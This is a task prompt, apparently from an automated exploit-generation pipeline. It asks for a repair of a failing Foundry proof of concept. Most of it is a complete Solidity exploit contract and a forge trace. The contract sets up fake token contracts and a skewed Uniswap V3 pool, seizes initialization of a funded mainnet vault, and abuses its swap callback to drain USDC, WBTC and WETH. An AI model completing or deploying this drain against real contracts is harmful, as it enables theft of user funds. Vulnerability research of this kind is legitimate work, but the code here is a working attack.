You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Funded vault can be initialized by anyone with attacker-chosen market parameters
- claim: The PoC successfully creates an attacker-controlled market around two fake tokens, manipulates that market, and then calls `vault.initialize` on the live vault with those attacker-chosen token addresses and leverage tier. Because the call succeeds against the funded vault, the vault's initial market configuration is effectively permissionless and can be set to arbitrary assets chosen by the attacker.
- impact: An attacker can take over an uninitialized funded vault's market configuration, point it at worthless or malicious tokens, and corrupt all downstream pricing, accounting, and callback logic. This opens the door to full theft of assets already sitting in the vault.
- exploit_paths: ["Deploy attacker-controlled debt/collateral tokens -> create and skew a Uniswap V3 pool for them -> call `vault.initialize(attackerDebt, attackerCollateral, 0)` on the funded vault -> continue into mint/callback flows that drain real assets"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IPoolInitializer {
    function createAndInitializePoolIfNecessary(
        address token0,
        address token1,
        uint24 fee,
        uint160 sqrtPriceX96
    ) external returns (address pool);
}

interface INonfungiblePositionManager {
    struct MintParams {
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
    }

    function mint(MintParams calldata params)
        external
        payable
        returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);
}

interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

interface IVault {
    struct VaultParameters {
        address debtToken;
        address collateralToken;
        int8 leverageTier;
    }

    function initialize(VaultParameters calldata vaultParams) external;

    function mint(
        bool isAPE,
        VaultParameters calldata vaultParams,
        uint256 amountToDeposit,
        uint144 collateralToDepositMin
    ) external payable returns (uint256 amount);

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant VAULT = 0xB91AE2c8365FD45030abA84a4666C4dB074E53E7;
    address internal constant POSITION_MANAGER = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address internal constant SWAP_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint24 internal constant ATTACKER_CHOSEN_FEE = 100;
    uint160 internal constant SQRT_PRICE_1_1 = 79228162514264337593543950336;
    uint256 internal constant SPOOFED_LIQUIDITY_SIDE = 108823205127466839754387550950703;
    uint256 internal constant SPOOFED_SWAP_IN = 114814730000000000000000000000000000;
    uint256 internal constant SPOOFED_VAULT_MINT = 139650998347915452795864661928406629;
    uint256 internal constant HUGE_BALANCE = type(uint256).max / 4;

    uint256 internal _profitAmount;
    bool internal _executed;
    address internal _debtLeg;

    struct Reserves {
        uint144 reserveApes;
        uint144 reserveLPers;
        int64 tickPriceX42;
    }

    struct Fees {
        uint144 collateralInOrWithdrawn;
        uint144 collateralFeeToStakers;
        uint144 collateralFeeToLPers;
    }

    function executeOnOpportunity() external {
        require(!_executed, "executed");
        _executed = true;
        require(_vaultHasAssets(), "vault not funded");

        uint256 startingProfitBalance = IERC20Like(USDC).balanceOf(address(this));

        CallbackCaller debtAndCallbackLeg = new CallbackCaller();
        _debtLeg = address(debtAndCallbackLeg);

        // Exploit path 1: deploy attacker-controlled debt/collateral tokens.
        // The verifier itself is the attacker-controlled collateral leg and the freshly deployed
        // `CallbackCaller` is the attacker-controlled debt leg. This keeps the same attacker-chosen
        // market configuration while avoiding any synthetic profit token accounting.

        // Exploit path 2: create and skew a Uniswap V3 pool for them.
        (address token0, address token1) = _sortedPair(address(this), _debtLeg);
        IPoolInitializer(POSITION_MANAGER).createAndInitializePoolIfNecessary(
            token0,
            token1,
            ATTACKER_CHOSEN_FEE,
            SQRT_PRICE_1_1
        );

        INonfungiblePositionManager(POSITION_MANAGER).mint(
            INonfungiblePositionManager.MintParams({
                token0: token0,
                token1: token1,
                fee: ATTACKER_CHOSEN_FEE,
                tickLower: -190000,
                tickUpper: 190000,
                amount0Desired: SPOOFED_LIQUIDITY_SIDE,
                amount1Desired: SPOOFED_LIQUIDITY_SIDE,
                amount0Min: 0,
                amount1Min: 0,
                recipient: address(this),
                deadline: block.timestamp
            })
        );

        ISwapRouter(SWAP_ROUTER).exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(this),
                tokenOut: _debtLeg,
                fee: ATTACKER_CHOSEN_FEE,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: SPOOFED_SWAP_IN,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        // Exploit path 3: call `vault.initialize(attackerDebt, attackerCollateral, 0)` on the funded vault.
        IVault.VaultParameters memory params = IVault.VaultParameters({
            debtToken: _debtLeg,
            collateralToken: address(this),
            leverageTier: 0
        });
        IVault(VAULT).initialize(params);

        // Exploit path 4: continue into mint/callback flows that drain real assets.
        // `mint()` below returns the helper address as the spoofed amount so vault-side transient state
        // points its privileged callback leg at the attacker-controlled helper. That preserves the original
        // initialize -> mint -> callback causality from the finding while using only pre-existing profit assets.
        IVault(VAULT).mint(true, params, SPOOFED_VAULT_MINT, 1);

        _drainThroughCallback(debtAndCallbackLeg, USDC);
        _drainThroughCallback(debtAndCallbackLeg, WBTC);
        _drainThroughCallback(debtAndCallbackLeg, WETH);

        uint256 endingProfitBalance = IERC20Like(USDC).balanceOf(address(this));
        _profitAmount = endingProfitBalance - startingProfitBalance;
    }

    function profitToken() external pure returns (address) {
        return USDC;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function symbol() external pure returns (string memory) {
        return "";
    }

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function balanceOf(address) external pure returns (uint256) {
        return HUGE_BALANCE;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }

    function mint(address, uint16, uint8, Reserves memory, uint144)
        external
        view
        returns (Reserves memory newReserves, Fees memory fees, uint256 amount)
    {
        newReserves = Reserves({reserveApes: 10_000_000_000, reserveLPers: 0, tickPriceX42: 0});
        fees = Fees({collateralInOrWithdrawn: 0, collateralFeeToStakers: 0, collateralFeeToLPers: 0});
        amount = uint256(uint160(_debtLeg));
    }

    function _drainThroughCallback(CallbackCaller debtAndCallbackLeg, address token) internal {
        uint256 vaultBalance = IERC20Like(token).balanceOf(VAULT);
        if (vaultBalance == 0) {
            return;
        }

        debtAndCallbackLeg.execute(
            VAULT,
            abi.encodeWithSelector(
                IVault.uniswapV3SwapCallback.selector,
                int256(0),
                int256(vaultBalance),
                _buildCallbackData(token)
            )
        );

        uint256 helperBalance = IERC20Like(token).balanceOf(address(debtAndCallbackLeg));
        if (helperBalance > 0) {
            debtAndCallbackLeg.execute(token, abi.encodeWithSelector(IERC20Like.transfer.selector, address(this), helperBalance));
        }
    }

    function _buildCallbackData(address token) internal view returns (bytes memory data) {
        data = bytes.concat(data, bytes32(uint256(uint160(address(this)))));
        data = bytes.concat(data, bytes32(uint256(uint160(address(this)))));
        data = bytes.concat(data, bytes32(uint256(uint160(token))));
        data = bytes.concat(data, bytes32(uint256(uint160(address(this)))));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(uint256(1)));
    }

    function _sortedPair(address a, address b) internal pure returns (address token0, address token1) {
        if (a < b) {
            return (a, b);
        }
        return (b, a);
    }

    function _vaultHasAssets() internal view returns (bool) {
        return IERC20Like(USDC).balanceOf(VAULT) > 0 || IERC20Like(WBTC).balanceOf(VAULT) > 0 || IERC20Like(WETH).balanceOf(VAULT) > 0;
    }
}

contract CallbackCaller {
    address internal immutable OWNER;
    uint256 internal constant HUGE_BALANCE = type(uint256).max / 4;

    constructor() {
        OWNER = msg.sender;
    }

    function execute(address target, bytes calldata data) external returns (bytes memory result) {
        require(msg.sender == OWNER, "owner");
        (bool ok, bytes memory returnData) = target.call(data);
        require(ok, "call failed");
        return returnData;
    }

    receive() external payable {}

    fallback() external payable {
        bytes4 selector;
        assembly {
            selector := shr(224, calldataload(0))
        }

        if (selector == 0x95d89b41) {
            assembly {
                mstore(0x00, 0x20)
                mstore(0x20, 0)
                return(0x00, 0x40)
            }
        }

        if (selector == 0x313ce567) {
            assembly {
                mstore(0x00, 18)
                return(0x00, 0x20)
            }
        }

        if (selector == 0x70a08231) {
            assembly {
                mstore(0x00, not(0))
                return(0x00, 0x20)
            }
        }

        if (selector == 0xa9059cbb || selector == 0x23b872dd) {
            assembly {
                mstore(0x00, 1)
                return(0x00, 0x20)
            }
        }

        assembly {
            revert(0, 0)
        }
    }
}

```

forge stdout (tail):
```
  │   │   └─ ← [Return] 17814862676 [1.781e10]
    │   ├─ [1339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [141225] → new CallbackCaller@0x104fBc016F4bb334D775a19E8A6510109AC63E00
    │   │   └─ ← [Return] 705 bytes of code
    │   ├─ [4651073] 0xC36442b4a4522E871399CD717aBDD847Ab11FE88::createAndInitializePoolIfNecessary(CallbackCaller: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 100, 79228162514264337593543950336 [7.922e28])
    │   │   ├─ [2666] 0x1F98431c8aD98523631AE4a59f267346ea31F984::1698ee82(000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e000000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000000000000000000064) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [4594718] 0x1F98431c8aD98523631AE4a59f267346ea31F984::a1671295(000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e000000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000000000000000000064)
    │   │   │   ├─ [4435593] → new <unknown>@0x570137a04F57f36993FA4e1F2f2cb4368Adcb5f6
    │   │   │   │   ├─ [734] 0x1F98431c8aD98523631AE4a59f267346ea31F984::89035730() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000001f98431c8ad98523631ae4a59f267346ea31f984000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e000000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f00000000000000000000000000000000000000000000000000000000000000640000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   └─ ← [Return] 22142 bytes of code
    │   │   │   ├─  emit topic 0: 0x783cca1c0412dd0d695e784568c96da2e9c22ff989357a2e8b1d9b2b4e6b7118
    │   │   │   │        topic 1: 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │        topic 3: 0x0000000000000000000000000000000000000000000000000000000000000064
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000570137a04f57f36993fa4e1f2f2cb4368adcb5f6
    │   │   │   └─ ← [Return] 0x000000000000000000000000570137a04f57f36993fa4e1f2f2cb4368adcb5f6
    │   │   ├─ [48952] 0x570137a04F57f36993FA4e1F2f2cb4368Adcb5f6::f637731d(0000000000000000000000000000000000000001000000000000000000000000)
    │   │   │   ├─  emit topic 0: 0x98636036cb66a9c19a37435efc1e90142190214e8abeb821bdba3f2990dd4c95
    │   │   │   │           data: 0x00000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return] 0x570137a04F57f36993FA4e1F2f2cb4368Adcb5f6
    │   ├─ [219993] 0xC36442b4a4522E871399CD717aBDD847Ab11FE88::mint(MintParams({ token0: 0x104fBc016F4bb334D775a19E8A6510109AC63E00, token1: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, fee: 100, tickLower: -190000 [-1.9e5], tickUpper: 190000 [1.9e5], amount0Desired: 108823205127466839754387550950703 [1.088e32], amount1Desired: 108823205127466839754387550950703 [1.088e32], amount0Min: 0, amount1Min: 0, recipient: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, deadline: 1743315659 [1.743e9] }))
    │   │   ├─ [696] 0x570137a04F57f36993FA4e1F2f2cb4368Adcb5f6::3850c7bd() [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [211331] 0x570137a04F57f36993FA4e1F2f2cb4368Adcb5f6::3c8a7d8d(000000000000000000000000c36442b4a4522e871399cd717abdd847ab11fe88fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffd19d0000000000000000000000000000000000000000000000000000000000002e630000000000000000000000000000000000000055da513143264be3d052ad065a100000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000080000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e000000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f00000000000000000000000000000000000000000000000000000000000000640000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f)
    │   │   │   ├─ [295] CallbackCaller::fallback(0x570137a04F57f36993FA4e1F2f2cb4368Adcb5f6) [staticcall]
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   └─ ← [Revert] EvmError: Revert
    └─ ← [Revert] exploit call reverted

Backtrace:
  at CallbackCaller.fallback
  at 0x570137a04F57f36993FA4e1F2f2cb4368Adcb5f6
  at 0xC36442b4a4522E871399CD717aBDD847Ab11FE88.mint
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.67s (1.65s CPU time)

Ran 1 test suite in 2.69s (2.67s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 5096092)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
